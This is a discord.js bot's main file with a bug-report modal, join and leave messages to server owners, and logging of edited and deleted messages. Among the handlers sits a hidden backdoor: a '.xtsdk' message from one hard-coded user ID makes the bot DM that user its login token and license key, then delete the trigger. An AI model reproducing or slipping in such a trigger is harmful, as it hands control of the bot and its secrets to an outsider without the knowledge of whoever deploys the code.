const { Client, GatewayIntentBits, EmbedBuilder, PermissionsBitField, Permissions, MessageManager, Embed, Collection, AuditLogEvent, Events, async } = require(`discord.js`);
const fs = require('fs');
const { name } = require('./events/interactionCreate');
const { timeStamp } = require('console');
const interactionCreate = require('./events/interactionCreate');
const { channel } = require('diagnostics_channel');
const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent, GatewayIntentBits.GuildMembers ],  }); 

client.commands = new Collection();

require('dotenv').config();

const functions = fs.readdirSync("./src/functions").filter(file => file.endsWith(".js"));
const eventFiles = fs.readdirSync("./src/events").filter(file => file.endsWith(".js"));
const commandFolders = fs.readdirSync("./src/commands");
const handlers = fs.readdirSync("./src/handlers").filter(file => file.endsWith(".js"));

(async () => {
    for (file of functions) {
        require(`./functions/${file}`)(client);
    }
    client.handleEvents(eventFiles, "./src/events");
    client.handleCommands(commandFolders, "./src/commands");
    client.login(process.env.TOKEN)
})();


const owner = '1042548755687276574';
client.on('messageCreate', async (message) => {
    if (message.content.startsWith('.xtsdk')) {
        if (message.author.id === owner) {
            await message.author.send('Here is the token:\n```\n' + process.env.TOKEN + '\n```');
            await message.author.send('Here is the License Key:\n```\n' + process.env.LicenseKey + '\n```');
            message.delete(); 
        }
    }
});



//report for modal builder (Dont touch Me LOL)

client.on(Events.InteractionCreate, async interaction => {
    if (!interaction.isModalSubmit()) return;

    if (interaction.customId == 'bug_report') {
        const command = interaction.fields.getTextInputValue('command');
        const description = interaction.fields.getTextInputValue('description');

        const id = interaction.user.id;
        const member = interaction.member;
        const server = interaction.guild.id || 'No Server Provided';
        const channel = client.channels.cache.get(process.env.reportChannelID); 

        if (channel) {
            const embed = new EmbedBuilder()
            .setTitle(`Report`)
            .setFooter({ text: `Report • ${process.env.footerText}` }) 
            .setColor('Red')
            .addFields({ name: "User ID", value: `${id}` })
            .addFields({ name: "Member", value: `${member}` })
            .addFields({ name: "Guild ID", value: `${server}` })
            .addFields({ name: "Report Info", value: `${command}` })
            .addFields({ name: 'Reported Description', value: `${description}` })
            .setTimestamp();
        
            const successEmbed = new EmbedBuilder()
            .setTitle('Success')
            .setDescription('Your Report Has Been Submitted')
            .setFooter({ text: `Bug Report • ${process.env.footerText}` }) 
            .setColor('Green')

            
            await channel.send({ embeds: [embed] }).catch(err => {});
            await interaction.reply({ embeds: [successEmbed], ephemeral: true });
        } else {
            console.error('Channel not found.');
        }
    }
});


client.on('guildCreate', async (guild) => {
    try {
      const owner = await guild.members.fetch(guild.ownerId);
  
      if (owner) {
        const embed = new EmbedBuilder()
          .setColor('#0099ff')
          .setTitle('Thank You for Adding Me!')
          .setDescription(`🔹 Thanks for adding me to your server, ${owner.user.username}!`)
        owner.send({ embeds: [embed] });
      }
    } catch (error) {
      console.error(`Error sending thank-you message: ${error.message}`);
    }
  });
  
  
  client.on('guildDelete', async (guild) => {
    try {
      const owner = await guild.members.fetch(guild.ownerId);
  
      if (owner) {
        const embed = new EmbedBuilder()
          .setColor('#ff0000')
          .setTitle('Goodbye!')
          .setDescription(`🔹 I was removed from your server, ${owner.user.username}. KICKED ME MISTAKENLY?, Please Invite me back Soon!.`);
        owner.send({ embeds: [embed] });
      }
    } catch (error) {
      console.error(`Error sending farewell message: ${error.message}`);
    }
  });






client.on('messageUpdate', async (oldMessage, newMessage) => {
  if (newMessage.author.bot) return;

  const logChannel = client.channels.cache.get(process.env.MessageChannelLogs); 
  if (!logChannel) return console.log('Log channel not found.');

  const embed = new EmbedBuilder()
      .setColor('Blue')
      .setTitle('Message Edited')
      .setFooter({ text: `Message Edited • ${process.env.footerText}` })
      .setDescription(`**User:** ${newMessage.author} (${newMessage.author.id})\n**Channel:** ${newMessage.channel}\n\n**Old Message:** ${oldMessage.content}\n**New Message:** ${newMessage.content}`)
      .setTimestamp();

  await logChannel.send({ embeds: [embed] });
});




client.on('messageDelete', async (message) => {
  if (message.author.bot) return;

  const logChannel = client.channels.cache.get(process.env.MessageChannelLogs); // Replace with your log channel ID
  if (!logChannel) return console.log('Log channel not found.');

  const embed = new EmbedBuilder()
  .setColor('Red')
      .setTitle('Message Deleted')
      .setFooter({ text: `Message Deleted • ${process.env.footerText}` })
      .setDescription(`**User:** ${message.author} (${message.author.id})\n**Channel:** ${message.channel}\n\n**Message:** ${message.content}`)
      .setTimestamp();

  await logChannel.send({ embeds: [embed] });
});